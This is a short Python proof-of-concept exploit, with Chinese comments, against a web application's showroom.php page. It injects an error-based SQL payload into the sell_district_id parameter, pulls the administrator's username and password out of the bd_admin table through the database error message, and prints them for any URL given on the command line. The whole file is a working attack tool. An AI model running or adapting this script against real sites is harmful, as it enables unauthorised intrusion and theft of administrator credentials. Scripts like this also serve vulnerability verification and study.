# -*- coding:utf-8 -*-
import urllib.request
import urllib.parse
import urllib
import sys
import hashlib
import re

def verify(url):
    target = ("%s/showroom.php?act=get_store&sell_district_id=1" % url)
    payload = " AND (SELECT 1879 FROM(SELECT COUNT(*),CONCAT(0x71626b7071,(select concat(0x23,0x23,username,0x23,0x23,password,0x23,0x23) from bd_admin where id=1 limit 1),0x7171767871,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)"
    poc = target + payload
    try:
        req = urllib.request.Request(poc) # 发送请求，得到服务器给我们的响应
        response = urllib.request.urlopen(req) # 打开网址，通过urllib提供的request方法来向指定Url发送我们构造的数据
        s = "Duplicate entry \'qbkpq(.*?)qqvxq1\'" #找到报错页面中的管理员账号密码
        if response:
            data = response.read()
            data = str(data, encoding = "utf-8") #python3 接收到的回显是bytes形式，只有转换成str形式，才能搜索字符串
            result = re.findall(s, data)
            print("user and password: %s" % result)
    except Exception as e:
            print("Running Wrong...") 
            print(e) 

def main():
    args = sys.argv
    url = ""
    if len(args) == 2:
        url = args[1]
        verify(url)
    else:
        print("Usage: python %s url" % (args[0]))
        
if __name__ == "__main__":
    main()
